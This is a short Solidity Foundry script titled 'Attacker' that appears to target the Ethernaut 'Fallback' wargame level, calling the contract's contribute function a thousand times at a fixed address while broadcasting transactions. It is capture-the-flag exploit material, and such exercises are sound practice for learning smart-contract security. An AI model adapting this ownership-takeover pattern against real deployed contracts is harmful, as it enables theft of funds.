// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel01.sol";
import "forge-std/Test.sol";

contract Attacker is Test {
    Fallback level1 = Fallback(payable(0x55Eeb16A011A1e0e1205A9D56b80c3a3dEE8f34f));

    function test() external{
        vm.startBroadcast();

        for (uint i = 0; i < 1000; ++i) {
            level1.contribute{value: 1 wei}();
        }

        vm.stopBroadcast();
    }

}
